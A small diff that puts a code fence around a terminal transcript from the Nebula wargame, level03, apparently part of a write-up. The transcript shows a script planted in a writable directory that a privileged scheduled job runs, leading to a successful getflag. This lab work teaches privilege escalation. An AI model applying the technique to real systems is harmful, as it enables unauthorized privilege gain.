@@ -1,3 +1,4 @@
+```
 level03@nebula:/home/flag03/writable.d$ cat << EOF > blip.sh
 > #!/bin/bash
 > id > /tmp/whoami
@@ -21,3 +22,4 @@ level03@nebula:/home/flag03/writable.d$ cat << EOF > blip.sh
 
 level03@nebula:/home/flag03/writable.d$ cat /tmp/getflag
 You have successfully executed getflag on a target account
+```
